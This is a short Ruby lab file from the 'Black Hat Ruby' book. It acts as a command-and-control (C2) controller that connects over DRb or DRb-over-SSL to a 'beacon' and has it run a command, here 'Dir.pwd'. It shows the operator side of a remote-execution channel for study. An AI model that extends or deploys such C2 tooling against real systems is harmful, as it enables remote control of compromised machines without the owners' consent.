#!/usr/bin/env ruby
# ========================================================= #
# This file is a part of { Black Hat Ruby } book lab files. #
# ========================================================= #
#
# Author:
#   Sabri Hassanyah | @KINGSABRI
# Description:
#   DRuby Server (C2)
# Requirements:
#
require 'drb'
require 'drb/ssl'

begin
  # beacon = DRbObject.new_with_uri("druby://192.168.100.14:9911")    # Cleartext connection
  beacon = DRbObject.new_with_uri("drbssl://localhost:9911")   # SSL encrypted connection   
  puts beacon.run "Dir.pwd"
rescue Exception => e
  puts e
end
